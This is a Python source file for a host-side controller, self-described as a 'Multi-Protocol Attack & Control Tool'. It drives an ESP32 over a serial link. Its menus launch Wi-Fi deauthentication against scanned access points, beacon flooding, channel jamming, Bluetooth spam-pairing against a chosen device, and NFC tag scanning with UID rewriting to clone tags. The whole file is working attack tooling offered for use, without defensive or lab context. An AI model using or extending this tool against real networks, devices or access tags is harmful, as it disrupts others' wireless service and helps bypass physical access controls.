#!/usr/bin/env python3
import serial
import time
import threading
import os
import sys
import re
from colorama import init, Fore, Back, Style
import argparse

# Initialize colorama
init(autoreset=True)

# Banner
BANNER = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
{Fore.CYAN}║ {Fore.RED}███████{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗{Fore.RED}██████{Fore.GREEN}╗ {Fore.YELLOW}██{Fore.BLUE}╗{Fore.YELLOW}██████{Fore.BLUE}╗  {Fore.MAGENTA}██████{Fore.CYAN}╗ {Fore.WHITE}██{Fore.CYAN}╗  {Fore.WHITE}██{Fore.CYAN}╗ {Fore.CYAN}    ║
{Fore.CYAN}║ {Fore.RED}██{Fore.GREEN}╔════╝{Fore.RED}██{Fore.GREEN}╔════╝{Fore.RED}██{Fore.GREEN}╔══{Fore.RED}██{Fore.GREEN}╗{Fore.YELLOW}██{Fore.BLUE}║{Fore.YELLOW}██{Fore.BLUE}╔══{Fore.YELLOW}██{Fore.BLUE}╗{Fore.MAGENTA}██{Fore.CYAN}╔═══{Fore.MAGENTA}██{Fore.CYAN}╗{Fore.WHITE}██{Fore.CYAN}║  {Fore.WHITE}██{Fore.CYAN}║ {Fore.CYAN}    ║
{Fore.CYAN}║ {Fore.RED}█████{Fore.GREEN}╗  {Fore.RED}███████{Fore.GREEN}╗{Fore.RED}██████{Fore.GREEN}╔╝{Fore.YELLOW}██{Fore.BLUE}║{Fore.YELLOW}██████{Fore.BLUE}╔╝{Fore.MAGENTA}██{Fore.CYAN}║   {Fore.MAGENTA}██{Fore.CYAN}║{Fore.WHITE}███████{Fore.CYAN}║ {Fore.CYAN}    ║ 
{Fore.CYAN}║ {Fore.RED}██{Fore.GREEN}╔══╝  {Fore.GREEN}╚════{Fore.RED}██║{Fore.RED}██{Fore.GREEN}╔═══╝ {Fore.YELLOW}██{Fore.BLUE}║{Fore.YELLOW}██{Fore.BLUE}╔═══╝ {Fore.MAGENTA}██{Fore.CYAN}║   {Fore.MAGENTA}██{Fore.CYAN}║{Fore.WHITE}██{Fore.CYAN}╔══{Fore.WHITE}██{Fore.CYAN}║ {Fore.CYAN}    ║
{Fore.CYAN}║ {Fore.RED}███████{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}║{Fore.RED}██{Fore.GREEN}║     {Fore.YELLOW}██{Fore.BLUE}║{Fore.YELLOW}██{Fore.BLUE}║     {Fore.MAGENTA}╚{Fore.MAGENTA}██████{Fore.MAGENTA}╔{Fore.CYAN}╝{Fore.WHITE}██{Fore.CYAN}║  {Fore.WHITE}██{Fore.CYAN}║ {Fore.CYAN}    ║
{Fore.CYAN}║ {Fore.RED}╚══════{Fore.GREEN}╝{Fore.RED}╚══════{Fore.GREEN}╝{Fore.RED}╚═{Fore.GREEN}╝     {Fore.YELLOW}╚═{Fore.BLUE}╝{Fore.YELLOW}╚═{Fore.BLUE}╝      {Fore.MAGENTA}╚═════{Fore.CYAN}╝ {Fore.WHITE}╚═{Fore.CYAN}╝  {Fore.WHITE}╚═{Fore.CYAN}╝ {Fore.CYAN}    ║
{Fore.CYAN}╠══════════════════════════════════════════════════════════╣
{Fore.CYAN}║ {Fore.YELLOW}Multi-Protocol Attack & Control Tool {Fore.GREEN}v2.0              {Fore.CYAN}  ║
{Fore.CYAN}║ {Fore.WHITE}Simplified Menu System                               {Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════════════════════════════╝
"""

class ESP32Controller:
    def __init__(self, port, baudrate=115200, timeout=1):
        self.port = port
        self.baudrate = baudrate
        self.timeout = timeout
        self.serial = None
        self.running = False
        self.reader_thread = None
        self.scan_results = []
        self.current_module = ""
        self.saved_nfc = {}

    def connect(self):
        try:
            self.serial = serial.Serial(self.port, self.baudrate, timeout=self.timeout)
            time.sleep(2)
            print(f"{Fore.GREEN}[✓] Connected to ESP32 on {self.port}")
            return True
        except Exception as e:
            print(f"{Fore.RED}[✗] Failed to connect: {e}")
            return False

    def disconnect(self):
        if self.serial and self.serial.is_open:
            self.serial.close()
            print(f"{Fore.YELLOW}[i] Disconnected from ESP32")

    def start_reader(self):
        self.running = True
        self.reader_thread = threading.Thread(target=self._read_serial)
        self.reader_thread.daemon = True
        self.reader_thread.start()

    def stop_reader(self):
        self.running = False
        if self.reader_thread:
            self.reader_thread.join(timeout=1)

    def _read_serial(self):
        while self.running:
            if self.serial and self.serial.is_open and self.serial.in_waiting:
                try:
                    line = self.serial.readline().decode('utf-8').strip()
                    if line:
                        self._process_response(line)
                except Exception as e:
                    print(f"{Fore.RED}[✗] Error reading from serial: {e}")
            time.sleep(0.01)

    def _process_response(self, response):
        if response.startswith("WIFI_NETWORK:"):
            parts = response.split(":")
            if len(parts) >= 5:
                self.scan_results.append({
                    "mac": parts[1],
                    "ssid": parts[2],
                    "rssi": parts[3],
                    "channel": parts[4]
                })
        elif response.startswith("BT_DEVICE:"):
            parts = response.split(":")
            if len(parts) >= 4:
                self.scan_results.append({
                    "address": parts[1],
                    "name": parts[2],
                    "rssi": parts[3]
                })
        elif response.startswith("NFC_FOUND:"):
            parts = response.split(":")
            if len(parts) >= 3:
                self.scan_results.append({
                    "uid": parts[1],
                    "type": parts[2]
                })
        print(f"{Fore.CYAN}[LOG] {response}")

    def send_command(self, command):
        if not self.serial or not self.serial.is_open:
            print(f"{Fore.RED}[✗] Not connected to ESP32")
            return False
        try:
            self.serial.write((command + '\n').encode('utf-8'))
            self.serial.flush()
            return True
        except Exception as e:
            print(f"{Fore.RED}[✗] Failed to send command: {e}")
            return False

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)

def wifi_menu(controller):
    while True:
        clear_screen()
        print(f"\n{Fore.CYAN}Wi-Fi Menu:{Style.RESET_ALL}")
        print("a) Scan & Deauth")
        print("b) Beacon Flood")
        print("c) Channel Jam")
        print("x) Return to Main Menu")
        choice = input(f"{Fore.GREEN}Wi-Fi>{Fore.WHITE} ").lower()

        if choice == 'a':
            controller.scan_results = []
            controller.send_command("WIFI SCAN")
            time.sleep(5)  # Wait for scan results
            
            if not controller.scan_results:
                print(f"{Fore.RED}No networks found!")
                time.sleep(2)
                continue
                
            print(f"\n{Fore.CYAN}Found Networks:{Style.RESET_ALL}")
            for idx, net in enumerate(controller.scan_results, 1):
                print(f"{idx}) {net['ssid']} ({net['mac']}) Channel: {net['channel']}")
            
            deauth = input("\nDeauth targets? [Y/n]: ").lower() or 'y'
            if deauth == 'y':
                target = input("Enter target number: ")
                try:
                    mac = controller.scan_results[int(target)-1]['mac']
                    controller.send_command(f"WIFI DEAUTH {mac}")
                    print(f"{Fore.YELLOW}Deauth started on {mac}")
                except:
                    print(f"{Fore.RED}Invalid selection!")
                time.sleep(2)

        elif choice == 'b':
            ssid = input("Enter beacon name: ")
            count = input("Enter number of beacons: ")
            controller.send_command(f"WIFI BEACON {ssid} {count}")
            print(f"{Fore.YELLOW}Beacon flood started")
            time.sleep(2)

        elif choice == 'c':
            controller.send_command("WIFI SCAN")
            time.sleep(5)
            
            print(f"\n{Fore.CYAN}Select Channel to Jam:{Style.RESET_ALL}")
            channels = list(set(net['channel'] for net in controller.scan_results))
            for idx, ch in enumerate(channels, 1):
                print(f"{idx}) Channel {ch}")
            
            try:
                ch_choice = int(input("Select channel: "))
                controller.send_command(f"WIFI JAM {channels[ch_choice-1]}")
                print(f"{Fore.YELLOW}Jamming channel {channels[ch_choice-1]}")
            except:
                print(f"{Fore.RED}Invalid selection!")
            time.sleep(2)

        elif choice == 'x':
            return
        else:
            print(f"{Fore.RED}Invalid choice!")
            time.sleep(1)

def bluetooth_menu(controller):
    while True:
        clear_screen()
        print(f"\n{Fore.BLUE}Bluetooth Menu:{Style.RESET_ALL}")
        print("a) Scan & Spam Pair")
        print("x) Return to Main Menu")
        choice = input(f"{Fore.GREEN}BT>{Fore.WHITE} ").lower()

        if choice == 'a':
            controller.scan_results = []
            controller.send_command("BT SCAN")
            time.sleep(5)
            
            print(f"\n{Fore.BLUE}Found Devices:{Style.RESET_ALL}")
            for idx, dev in enumerate(controller.scan_results, 1):
                print(f"{idx}) {dev['name']} ({dev['address']})")
            
            spam = input("\nStart spam pairing? [Y/n]: ").lower() or 'y'
            if spam == 'y':
                target = input("Enter device number: ")
                try:
                    addr = controller.scan_results[int(target)-1]['address']
                    mins = input("Enter duration (minutes): ")
                    controller.send_command(f"BT SPAMPAIR {addr} {mins}")
                    print(f"{Fore.YELLOW}Spam pairing started")
                except:
                    print(f"{Fore.RED}Invalid selection!")
                time.sleep(2)

        elif choice == 'x':
            return
        else:
            print(f"{Fore.RED}Invalid choice!")
            time.sleep(1)

def nfc_menu(controller):
    while True:
        clear_screen()
        print(f"\n{Fore.YELLOW}NFC Menu:{Style.RESET_ALL}")
        print("a) Scan & Save")
        print("b) Load Saved")
        print("x) Return to Main Menu")
        choice = input(f"{Fore.GREEN}NFC>{Fore.WHITE} ").lower()

        if choice == 'a':
            controller.scan_results = []
            controller.send_command("NFC SCAN")
            time.sleep(3)
            
            if controller.scan_results:
                nfc = controller.scan_results[0]
                save = input(f"Save {nfc['uid']}? [Y/n]: ").lower() or 'y'
                if save == 'y':
                    name = input("Enter name for tag: ")
                    controller.saved_nfc[name] = nfc
                    print(f"{Fore.GREEN}Tag saved as {name}")
            else:
                print(f"{Fore.RED}No tag detected!")
            time.sleep(2)

        elif choice == 'b':
            print(f"\n{Fore.YELLOW}Saved Tags:{Style.RESET_ALL}")
            for name, tag in controller.saved_nfc.items():
                print(f"{name}: {tag['uid']} ({tag['type']})")
            
            load = input("\nEnter name to load (or blank to cancel): ")
            if load in controller.saved_nfc:
                controller.send_command(f"NFC WRITE {controller.saved_nfc[load]['uid']}")
                print(f"{Fore.GREEN}Writing tag...")
            time.sleep(2)

        elif choice == 'x':
            return
        else:
            print(f"{Fore.RED}Invalid choice!")
            time.sleep(1)

def main():
    parser = argparse.ArgumentParser(description='ESP32 Control Tool')
    parser.add_argument('-p', '--port', required=True, help='Serial port')
    parser.add_argument('-b', '--baud', type=int, default=115200, help='Baud rate')
    args = parser.parse_args()

    controller = ESP32Controller(args.port, args.baud)
    if not controller.connect():
        sys.exit(1)

    controller.start_reader()
    clear_screen()

    while True:
        print(f"\n{Fore.CYAN}Main Menu:{Style.RESET_ALL}")
        print("1) Wi-Fi Tools")
        print("2) Bluetooth Tools")
        print("3) NFC Tools")
        print("0) Exit")
        choice = input(f"{Fore.GREEN}Main>{Fore.WHITE} ")

        if choice == '1':
            wifi_menu(controller)
        elif choice == '2':
            bluetooth_menu(controller)
        elif choice == '3':
            nfc_menu(controller)
        elif choice == '0':
            break
        else:
            print(f"{Fore.RED}Invalid choice!")
            time.sleep(1)

    controller.stop_reader()
    controller.disconnect()
    print(f"{Fore.YELLOW}Exiting. Goodbye!")

if __name__ == "__main__":
    main()
